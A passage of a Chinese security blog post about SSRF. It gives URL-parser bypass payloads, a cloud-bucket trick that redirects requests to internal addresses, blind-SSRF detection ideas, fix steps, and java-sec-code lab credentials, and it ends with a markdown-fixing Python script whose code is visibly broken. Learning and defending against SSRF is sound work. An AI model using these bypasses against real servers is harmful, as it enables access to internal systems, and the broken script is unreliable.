<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662477573859-941ac1ba-2ee9-4bc5-ac54-44df05f9294f.png" alt="image.png"><br>这个方法可以在SSRF的中众多<strong>伪协议被禁止</strong>并且只能够使用<strong>它规定的某些协议</strong>的情况下来进行读取文件</p>
<h3 id="利用URL的解析问题"><a href="#利用URL的解析问题" class="headerlink" title="利用URL的解析问题"></a>利用URL的解析问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.1.1.1:80\@127.2.2.2:80/</span></span><br><span class="line">http:<span class="comment">//127.1.1.1:80\@@127.2.2.2:80/</span></span><br><span class="line">http:<span class="comment">//127.1.1.1:80:\@@127.2.2.2:80/</span></span><br><span class="line">http:<span class="comment">//127.1.1.1:80#\@127.2.2.2:80/</span></span><br></pre></td></tr></table></figure>
<p>可以看看，比较CTF了，算。。。<br>该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为<a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》</a>的分享，主要是利用 readfile 和 parse_url 函数的解析差异以及 curl 和 parse_url 解析差异来进行绕过哦。</p>
<h3 id="绕过过滤不严格"><a href="#绕过过滤不严格" class="headerlink" title="绕过过滤不严格"></a>绕过过滤不严格</h3><p>部分开发喜欢写正则去限制，遇到的问题也比较多，比如最常见的就是只判断内容，比如<br>baidu.com<br>baidu.com.hacker.com<br>还有一些其它的，主要看代码怎么写的了</p>
<h3 id="When-TLS-Hacks-You"><a href="#When-TLS-Hacks-You" class="headerlink" title="When TLS Hacks You"></a>When TLS Hacks You</h3><p>还是TTL的问题<br><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/179">SSRF安全指北 - 博客 - 腾讯安全应急响应中心</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8351">利用DNS缓存和TLS协议将受限SSRF变为通用SSRF - 先知社区</a></p>
<h3 id="存储桶回源绕过"><a href="#存储桶回源绕过" class="headerlink" title="存储桶回源绕过"></a>存储桶回源绕过</h3><p>这东西和前面的类似<br>此处使用腾讯云存储桶，设置存储桶为静态网站，再添加回源地址，此处的回源地址会限制不允许内网地址，可以通过先解析为外网地址，然后保存后子再修改解析地址为内网地址，就可以成功设置为内网地址的回源。<br>使用方法：将可能存在ssrf的位置输入该静态网站地址即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662643466000-51438320-22cb-4b06-88c6-699925bda773.png" alt="image.png"></p>
<h2 id="SSRF验证"><a href="#SSRF验证" class="headerlink" title="SSRF验证"></a>SSRF验证</h2><p>ssrf主要从后面写的出现点找漏洞，白盒主要针对上述危险函数来分析。然后打DNS就可以了。然后看会不会直接返回的Banner、title、content等信息，没有的话注意bool型SSRF。<br>所以我们根据上述的类型，可以看看验证方法</p>
<h3 id="Basic-SSRF"><a href="#Basic-SSRF" class="headerlink" title="Basic SSRF"></a>Basic SSRF</h3><p>有回显的SSRF比较简单，就不说了，主要看无回显的</p>
<h3 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h3><p>和上面正好相反，不会返回结果到客户端，简单分个类吧，和sql注入盲注类似。</p>
<ul>
<li>_Boolean-Based：_无论资源是否存在，服务器的回应都是不同的</li>
<li>_Error-Based：_例如HTTP（404或500），指示资源是否存在</li>
<li>_Time-Based：_如果无论资源是否存在，服务器的响应都保持不变，响应时间可能会有很大差异。</li>
</ul>
<p>记得面试某银行安全岗，面试官问过我这个问题，答的不怎么样，因为没接触过过，所以思路比较跳，前面说的这三种常见的倒没回答上来，前面三个类型的话，比较和sql注入类似，<br>首先我们先用DNS测是否有SSRF,或者burpsuit Collaborator Client模块也可以</p>
<p>对于Boolean，可以用来探测端口等等，或者攻击成功失败回显，具体还得看怎么个布尔法<br>对于Error，也差不多类似，Time的就看响应时间罢了。</p>
<p>然后面试官最后问了我盲注还限制了只能内网，无法使用DNS，这个点的话，怎么办，<br>我当时想着可以看看能不能对这个网站自己发起请求，比如增删改查什么东西，这样来证明SSRF,或者针对内网服务。<br>然后还可以内网打payload，根据<strong>响应时间</strong>来判断内网资产是否存在。<br>然后就是注意该IP的其他端口，比如不对公网开放的数据库端口，这个具体看你对整个网络的分析，看看有什么攻击链路没有来证明网络是否存在，这个和前面差不多，但可能有时候会比较好利用一些。</p>
<p>具体结合环境，可以看看这篇<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1264/#toc_0x03-boolssrf">Bool型SSRF的思考与实践 - 跳跳糖</a></p>
<p>其他我也感觉没啥好办法了emmmmm。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/120624292">SSRF盲打 &amp; Collaborator everywhere_浔阳江头夜送客丶的博客-CSDN博客_adns盲ssrf</a><br><a target="_blank" rel="noopener" href="https://github.com/1135/notes/blob/master/web_vul_SSRF.md">https://github.com/1135/notes/blob/master/web_vul_SSRF.md</a></p>
<h3 id="云中的SSRF"><a href="#云中的SSRF" class="headerlink" title="云中的SSRF"></a>云中的SSRF</h3><p><a target="_blank" rel="noopener" href="https://spidersilk.com/news/cloud-is-more-fun-with-an-ssrf">spiderSilk</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2871">利用NodeJS SSRF漏洞获取AWS完全控制权限 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://daimajiaoliu.com/daima/48335dca6900408">亚马逊EC2主机环境：挖掘Node&#x2F;Express应用上的SSRF漏洞</a></p>
<h2 id="SSRF出现点"><a href="#SSRF出现点" class="headerlink" title="SSRF出现点"></a>SSRF出现点</h2><ul>
<li>社交分享功能：获取超链接的标题等内容进行显示</li>
<li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li>
<li>在线翻译：给网址翻译对应网页的内容</li>
<li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</li>
<li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li>
<li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li>
<li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li>
<li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li>
<li>邮件系统：比如接收邮件服务器地址</li>
<li>编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li>
<li>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li>
</ul>
<p>或者另外一个老哥分享的</p>
<ul>
<li>分享功能，通过 URL 地址分享网页内容早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的标签或者标签中content的文本内容作为显示以提供更好的用户体验</li>
<li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务</li>
<li>在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等</li>
<li>图片加载与下载：通过URL地址加载或下载图片图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题）</li>
<li>图片、文章收藏功能<br>此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载</li>
<li>未公开的api实现以及其他调用URL的功能此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</li>
<li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li>
<li>邮件系统：比如接收邮件服务器地址</li>
<li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li>
<li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li>
<li>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li>
<li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li>
<li>web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</li>
<li>文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</li>
<li>链接扩展: 最近Mark Litchfield在推特扩展链接上发现了漏洞，名声大涨。</li>
<li>文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a target="_blank" rel="noopener" href="https://hackerone.com/reports/713">例子</a></li>
<li>PDF生成器：试着注入指向内部服务的<iframe><img>,<base>或者<script>元素或者CSS的url()函数。</li>
</ul>
<h2 id="SSRF修复"><a href="#SSRF修复" class="headerlink" title="SSRF修复"></a>SSRF修复</h2><ol>
<li>去除url中的特殊字符</li>
<li>判断是否属于内网ip</li>
<li>如果是域名的话，将url中的域名改为ip</li>
<li>请求的url为3中返回的url</li>
<li>请求时设置host header为ip</li>
<li>不跟随30x跳转（跟随跳转需要从1开始重新检测）</li>
</ol>
<p>正确使用白名单，会好很多，业务需求不同，修的也不同，黑白名单组合对业务可能有时候会友好些，我理解。<br><a target="_blank" rel="noopener" href="https://joychou.org/java/use-dnsrebinding-to-bypass-ssrf-in-java.html">Use DNS Rebinding to Bypass SSRF in JAVA - 贫民窟的艺术家</a><br>看大哥这边的修复手段</p>
<ol>
<li>取URL的Host</li>
<li>取Host的IP</li>
<li>判断是否是内网IP，是内网IP直接return，不再往下执行</li>
<li>请求URL</li>
<li>如果有跳转，取出跳转URL，执行第1步</li>
<li>正常的业务逻辑里，当判断完成最后会去请求URL，实现业务逻辑。</li>
</ol>
<p>具体代码，靶场那个项目有些具体check代码，可以参考下</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>参考的太多了，就写记得链接的了。。。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/117728234">----已搬运----【总章程】SSRF完全学习，，什么都有，，，原理，绕过，攻击_Zero_Adam的博客-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.com/articles-41070.html">SSRF漏洞(原理&绕过姿势) - T00ls.Com</a><br><a target="_blank" rel="noopener" href="https://www.hacking8.com/cheatsheet/ssrf.html">ssrf cheatsheet - 像黑客一样学习</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8351">利用DNS缓存和TLS协议将受限SSRF变为通用SSRF - 先知社区</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11050">SSRF检测的一些思考 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9177">BlackHat2020 议题 「When TLS Hacks You」 复现 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7112">浅析SSRF与文件读取的一些小特性 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/291036.html">浅谈云上攻防——SSRF漏洞带来的新威胁 - FreeBuf网络安全行业门户</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8707">DNS Rebinding Bypass SSRF - 先知社区</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/101058">SSRF技巧之如何绕过filter_var( ) - 安全客，安全资讯平台</a><br><a target="_blank" rel="noopener" href="https://view.inews.qq.com/a/20220527A04MK900">SSRF攻击示例和缓解措施</a></p>
<h2 id="java-sec-code"><a href="#java-sec-code" class="headerlink" title="java-sec-code"></a>java-sec-code</h2><p>配置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123</span><br><span class="line">joychou/joychou123</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661786323586-aafcc1a4-819d-4c97-b29e-8c8beaf3d690.png" alt="image.png"></p>
<p><strong>程序包java.util不存在</strong><br>导入Springboot项目遇到 java: 程序包org.springframework.util不存在<br>#这是maven项目导入冲突造成<br>删除项目中.idea文件夹<br>关闭项目重新import项目！<br>注意选择文件夹路径时一定确认是否删除了idea文件夹！<br>打开后<br>重新编译即可</p>
<h2 id="修复语雀导出为md文件的图片样式错误问题"><a href="#修复语雀导出为md文件的图片样式错误问题" class="headerlink" title="修复语雀导出为md文件的图片样式错误问题"></a>修复语雀导出为md文件的图片样式错误问题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// yq_fix_md_pics.py</span><br><span class="line">// Author: David Wu</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rewrite_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;igonre&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">        text = re.sub(<span class="string">r&#x27;png)</span></span><br><span class="line"><span class="string">    with open(filename, &#x27;</span>w+<span class="string">&#x27;, encoding=&#x27;</span>utf-<span class="number">8</span><span class="string">&#x27;, errors=&#x27;</span>igonre<span class="string">&#x27;) as f:</span></span><br><span class="line"><span class="string">        f.write(text)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def fix_md_files(path):</span></span><br><span class="line"><span class="string">    for filename in os.listdir(path):</span></span><br><span class="line"><span class="string">        rewrite_file(path + &#x27;</span>\\<span class="string">&#x27; + filename)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def fix_specified_md_file(filename):</span></span><br><span class="line"><span class="string">    rewrite_file(filename)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    parser = argparse.ArgumentParser(description=&#x27;</span>Fix wrong pictures\<span class="string">&#x27; type of md file(s) from yuque.\nNote: If your string has spaces, you need to enclose it in double quotes.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--path&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, dest=<span class="string">&#x27;path&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Path where your md files are loacted&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--md&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, dest=<span class="string">&#x27;md&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Specify the md file you wanna fix.&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.path != <span class="literal">None</span> <span class="keyword">and</span> args.md != <span class="literal">None</span>:</span><br><span class="line">        sys.exit(<span class="string">&#x27;You must input just one argument like -p path or -m mdfile. \ne.g. python3 yq_fix_md_pics.py -p C:\\Test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.path != <span class="literal">None</span>:</span><br><span class="line">        fix_md_files(args.path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.md != <span class="literal">None</span>:</span><br><span class="line">        fix_specified_md_file(args.md)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用法：<br>第一种：直接修改该目录下的所有.md文件内的图片格式。<br>python3 yq_fix_md_pics.py -p C:\Test<br>python3 yq_fix_md_pics.py --path C:\Test<br>第二种：修改单个md文件<br>python3 yq_fix_md_pics.py -m C:\Test\a.md<br>python3 yq_fix_md_pics.py --md C:\Test\a.md</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42445757/article/details/124843848">https://blog.csdn.net/qq_42445757/article/details/124843848</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/05/20/burp%E6%8F%92%E4%BB%B6/" rel="prev" title="burp插件的简单入门">
      <i class="fa fa-chevron-left"></i> burp插件的简单入门
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E7%AE%80%E4%BB%8B"><span class="nav-text">SSRF简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E7%B1%BB%E5%9E%8B"><span class="nav-text">SSRF类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">SSRF利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D"><span class="nav-text">SSRF协议介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#java%EF%BC%8Cphp%E7%9A%84%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-text">java，php的支持的协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-x2F-x2F"><span class="nav-text">http:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-x2F-x2F"><span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict-x2F-x2F"><span class="nav-text">dict:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sftp-x2F-x2F"><span class="nav-text">sftp:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ldap-x2F-x2F-%E6%88%96ldaps-x2F-x2F-%E6%88%96ldapi-x2F-x2F"><span class="nav-text">ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tftp-x2F-x2F"><span class="nav-text">tftp:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RESP%E5%8D%8F%E8%AE%AE"><span class="nav-text">RESP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher-x2F-x2F"><span class="nav-text">gopher:&#x2F;&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-text">系统局限性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">更多攻击面</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%BE%8B%E5%AD%90"><span class="nav-text">常见例子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="nav-text">SSRF常见的漏洞函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-text">php</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9Aphp%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="nav-text">前置知识：php常用协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-ssrf%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="nav-text">php ssrf常见函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl-exec"><span class="nav-text">curl_exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-get-contents"><span class="nav-text">file_get_contents()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fsockopen"><span class="nav-text">fsockopen()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#readfile"><span class="nav-text">readfile()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fopen"><span class="nav-text">fopen()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SoupClient-%E7%B1%BB"><span class="nav-text">SoupClient 类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E5%85%B3%E4%BA%8Essrf%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B1%80%E9%99%90"><span class="nav-text">php关于ssrf的一些局限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java"><span class="nav-text">java</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#java%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-text">java网络请求支持的协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java-ssrf%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">java ssrf常见的函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URLConnection-URL"><span class="nav-text">URLConnection|URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HttpURLConnection"><span class="nav-text">HttpURLConnection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#httpClient"><span class="nav-text">httpClient</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#request"><span class="nav-text">request</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#openStream"><span class="nav-text">openStream</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#imageIO"><span class="nav-text">imageIO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#okhttp"><span class="nav-text">okhttp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#commonHttpClient"><span class="nav-text">commonHttpClient</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Jsoup"><span class="nav-text">Jsoup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IOUtils"><span class="nav-text">IOUtils</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HttpSyncClients"><span class="nav-text">HttpSyncClients</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E5%87%BD%E6%95%B0"><span class="nav-text">后续函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java%E5%85%B3%E4%BA%8Essrf%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B1%80%E9%99%90"><span class="nav-text">java关于ssrf的一些局限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-text">python</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python-ssrf%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9"><span class="nav-text">python ssrf注意的点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81"><span class="nav-text">协议支持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#requests"><span class="nav-text">requests</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#urllib-urlopen"><span class="nav-text">urllib.urlopen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pycurl"><span class="nav-text">pycurl</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go"><span class="nav-text">go</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#net-x2F-http"><span class="nav-text">net&#x2F;http</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nodejs"><span class="nav-text">nodejs</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="nav-text">SSRF常见绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%9B%9E%E7%8E%AF%E5%9C%B0%E5%9D%80%E7%9A%84%E5%85%B6%E4%BB%96%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F"><span class="nav-text">本地回环地址的其他表现形式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0-%E7%BB%95%E8%BF%87"><span class="nav-text">添加@绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#302%E8%B7%B3%E8%BD%AC-dns%E8%A7%A3%E6%9E%90%EF%BC%88%E8%BF%99%E7%A7%8D%E5%BE%97%E6%94%AF%E6%8C%81%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%89"><span class="nav-text">302跳转,dns解析（这种得支持重定向）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%85%B6%E4%BB%96%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-text">利用其他协议绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Enclosed-alphanumerics%E7%BB%95%E8%BF%87"><span class="nav-text">利用Enclosed alphanumerics绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%A5%E5%8F%B7%E6%9B%BF%E4%BB%A3-%E7%BB%95%E8%BF%87"><span class="nav-text">句号替代.绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%81%E7%95%A5%E4%B8%AD%E9%97%B4%E7%9A%840"><span class="nav-text">省略中间的0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A0"><span class="nav-text">特殊0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8-%E7%BB%95%E8%BF%87localhost"><span class="nav-text">用[::]绕过localhost</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipv6"><span class="nav-text">ipv6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%AD%E7%BD%91%E5%9D%80%E7%BC%A9%E7%9F%AD"><span class="nav-text">短网址缩短</span></a></li><li class="nav-item 